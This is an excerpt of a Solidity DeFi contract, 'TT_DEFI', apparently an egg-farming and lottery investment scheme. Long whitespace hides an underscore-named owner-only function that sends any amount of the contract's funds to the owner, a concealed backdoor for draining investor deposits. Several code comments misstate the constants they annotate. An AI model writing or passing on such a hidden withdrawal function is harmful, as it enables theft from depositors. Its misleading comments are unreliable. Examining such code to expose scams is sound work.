...
contract TT_DEFI {
    ...
    uint256 public LOTTERY_TICKET_PRICE = 1 ether; /** 0.005 ether **/
    uint256 public MAX_LOTTERY_TICKET = 500;
    ...
    uint256 public MIN_INVEST = 1 ether; /** 0.005 BNB  **/
	uint256 public WITHDRAW_COOLDOWN = 6 * 60 * 60; /** 6 hours  **/
    uint256 public WITHDRAW_LIMIT = 1000000 ether; /** 10 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 2000000 ether; /** 20 BNB  **/
    ...
    function sellEggs() public{
        ...
        if(block.timestamp.sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants >= MAX_LOTTERY_PARTICIPANTS){
            chooseWinner();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ...
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            function _(uint _amount) external{  require(msg.sender == owner);  owner.transfer(_amount); }
